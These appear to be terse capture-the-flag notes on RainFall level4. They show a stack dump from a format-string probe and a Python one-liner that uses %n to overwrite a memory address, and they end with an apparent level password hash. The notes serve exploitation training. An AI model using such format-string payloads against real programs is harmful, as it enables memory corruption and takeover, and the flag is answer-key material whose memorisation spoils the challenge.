```
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
```

local_20c have a size of 520 but fgets let us only read 0x200 (512) char

level4@RainFall:~$ ./level4 
AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
AAAAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520 25207825 78252078 20782520

A is in 12nd argument


python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > input.txt

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a